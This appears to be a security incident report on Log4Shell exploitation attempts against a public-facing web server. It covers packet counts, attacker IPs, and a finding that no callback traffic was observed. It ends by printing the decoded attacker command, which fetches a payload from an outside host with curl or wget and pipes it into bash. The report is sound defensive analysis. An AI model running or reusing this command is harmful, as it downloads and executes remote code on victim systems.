# Web Application Security Incident Report

## Classification

**Log4Shell Exploitation Attempt**

## Severity

**High**

---

## Affected Asset

- IP Address: `198.71.247.91`
- Asset Type: Public-Facing Web Server

---

## Executive Summary

Network traffic analysis identified repeated Log4Shell exploitation attempts against a public-facing web server.

Multiple external systems sent HTTP requests containing JNDI injection payloads. A primary source, `195.54.160.149`, delivered a payload containing a Base64-encoded command designed to retrieve content from attacker-controlled infrastructure using `curl` or `wget` and pipe the retrieved content into `bash`.

No outbound victim communication to the specified LDAP callback or second-stage retrieval ports was observed.

Successful exploitation therefore could not be confirmed from the available network evidence.

---

## Key Findings

- 80,843 packets analyzed.
- 25 JNDI-containing packets identified.
- 8 external JNDI attack sources observed.
- Primary source: `195.54.160.149`.
- 59 HTTP requests observed from the primary source.
- 5 JNDI-containing packets associated with the primary source.
- Base64-encoded command identified and decoded.
- Intended LDAP callback: `195.54.160.149:12344`.
- Intended second-stage retrieval: `195.54.160.149:5874`.
- No traffic to either intended callback port was observed.
- Primary source was flagged by 14 VirusTotal vendors at the time of analysis.

---

## Decoded Command

```bash
(curl -s 195.54.160.149:5874/198.71.247.91:80||wget -q -O- 195.54.160.149:5874/198.71.247.91:80)|bash